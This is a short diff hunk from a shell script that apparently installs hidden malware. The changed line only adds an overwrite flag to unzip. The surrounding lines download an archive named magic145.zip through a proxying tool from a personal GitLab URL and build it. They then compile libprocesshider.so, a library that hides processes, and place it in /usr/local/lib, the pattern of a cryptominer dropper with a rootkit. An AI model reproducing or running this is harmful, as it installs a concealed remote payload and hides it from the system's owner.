@@ -39,7 +39,7 @@ echo " "
 chmod +x 145
 
 ./graftcp/graftcp wget https://gitlab.com/jiorio669/donlod/-/raw/main/magic145.zip
-unzip magic145.zip
+unzip -o magic145.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
